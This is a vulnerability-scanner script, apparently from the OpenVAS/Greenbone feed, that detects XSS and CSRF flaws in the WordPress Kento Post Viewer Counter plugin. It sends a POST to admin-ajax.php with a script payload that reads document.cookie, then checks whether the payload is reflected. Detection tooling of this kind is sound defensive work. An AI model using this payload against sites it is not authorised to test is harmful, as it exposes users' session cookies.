CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.111105" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_tag( name: "cvss_base", value: "6.4" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2016-06-13 16:12:12 +0200 (Mon, 13 Jun 2016)" );
	script_name( "WordPress Kento Post Viewer Counter Plugin Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 SCHUTZWERK GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://wpvulndb.com/vulnerabilities/8480" );
	script_xref( name: "URL", value: "http://www.openwall.com/lists/oss-security/2016/04/16/3" );
	script_xref( name: "URL", value: "http://www.openwall.com/lists/oss-security/2016/04/16/2" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/136736/" );
	script_tag( name: "summary", value: "The host is installed with WordPress
  Kento Post Viewer Counter Plugin and is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send crafted data via HTTP POST request and check
  whether it is possible to read a cookie or not." );
	script_tag( name: "insight", value: "Multiple flaws are due to:

  - The wp-content\\plugins\\kento-post-view-counter\\index.php script not properly sanitizing
    user-supplied input to the 'kento_pvc_geo' POST parameter.

  - The wp-content\\plugins\\kento-post-view-counter\\kento-pvc-admin.php script not properly
    sanitizing user-supplied input to the 'kento_pvc_numbers_lang', 'kento_pvc_today_text'
    and 'kento_pvc_total_text' parameter.

  - No CSRF token used for POST forms" );
	script_tag( name: "impact", value: "Successfully exploiting this issue allow
  remote attacker to execute arbitrary script code in a user's browser
  session within the trust relationship." );
	script_tag( name: "affected", value: "WordPress Kento Post Viewer Counter Plugin <= 2.8" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the product
  by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/wp-admin/admin-ajax.php";
data = "action=kento_pvc_top_geo&kento_pvc_geo=<script>alert(document.cookie);</script>";
req = http_post_put_req( port: port, url: url, data: data, add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
res = http_keepalive_send_recv( port: port, data: req );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && egrep( pattern: "<script>alert\\(document.cookie\\);</script>", string: res, icase: TRUE )){
	report = http_report_vuln_url( url: url, port: port );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

